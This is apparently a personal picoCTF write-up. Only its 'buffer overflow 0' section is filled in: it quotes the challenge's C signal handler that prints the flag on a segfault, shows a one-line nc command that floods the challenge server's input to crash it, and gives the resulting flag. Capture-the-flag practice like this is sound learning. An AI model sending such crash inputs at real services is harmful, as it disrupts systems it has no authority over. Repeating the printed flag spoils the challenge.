# buffer overflow 0
Challenge provides a source code from which it's immediately obvious that upon a `SIGSEGV` signal the flag is given out
```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```
...
```c
signal(SIGSEGV, sigsegv_handler); // Set up signal handler
```
Therefore, let's try to enter a REALLY big input in an attempt to stack smash.
```bash
(base) achu@air ~ % nc saturn.picoctf.net 62854 <<< $(printf "Get smashed lol %.0s" {1..69})
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
(base) achu@air ~ % 
```
And we get our flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`.

# format string 0
TBD

# flag leak
TBD
